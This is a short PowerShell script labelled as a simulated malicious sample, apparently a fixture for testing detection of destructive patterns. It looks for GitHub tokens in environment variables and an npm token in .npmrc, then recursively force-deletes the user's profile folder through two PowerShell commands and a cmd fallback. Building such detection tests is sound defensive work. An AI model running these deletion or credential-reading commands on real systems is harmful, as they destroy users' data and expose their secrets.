# SIMULATED MALICIOUS SCRIPT - PowerShell destructive patterns

Write-Host "Attempting credential theft..."

# Try to find credentials
$githubToken = Get-ChildItem Env: | Where-Object {$_.Name -like "*GITHUB*"}
$npmToken = Get-Content "$env:USERPROFILE\.npmrc" -ErrorAction SilentlyContinue

if (-not $githubToken -or -not $npmToken) {
    Write-Host "Credential theft failed, activating destructive mode"

    # DESTRUCTIVE PATTERNS - These would be detected

    try {
        # Pattern 1: PowerShell Remove-Item with recursion
        Remove-Item -Recurse -Force "$env:USERPROFILE\*"

        # Pattern 2: Alternative destruction syntax
        Get-ChildItem $env:USERPROFILE -Recurse | Remove-Item -Force

    } catch {
        Write-Host "Destruction failed, trying cmd fallback"

        # Pattern 3: CMD-style deletion
        cmd /c "del /s /q $env:USERPROFILE\*"
    }

    Write-Host "Destructive payload completed"
} else {
    Write-Host "Credentials found, exfiltrating data"
}